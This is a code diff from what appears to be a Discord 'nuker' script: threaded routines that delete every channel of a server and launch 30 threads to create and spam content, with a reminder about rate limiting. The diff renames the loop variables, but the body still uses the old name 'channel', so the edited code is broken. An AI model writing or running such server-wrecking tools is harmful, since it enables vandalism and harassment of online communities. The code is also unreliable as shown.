@@ -151,12 +151,12 @@ Choice: """, end="")
         print(f'{red}[!]{white} Nuker is ready, Press any key to launch.')
         print(f"{red}[X]{white} If the nuker is crashing on this window, you're being rate limited")
         input()
-        for channel in guild_channels:
+        for i in guild_channels:
             # t = threading.Thread(target=removechan, args=(channel['channel-id'],))
             t = threading.Thread(target=removechan, args=(channel['id'],))
             t.start()
 
-        for _ in range(30):
+        for k in range(30):
             # t = threading.Thread(target=roles, args=(guildid, names, msg,))
             t = threading.Thread(target=makeandspam, args=(guildid, names, msg,))
             t.start()
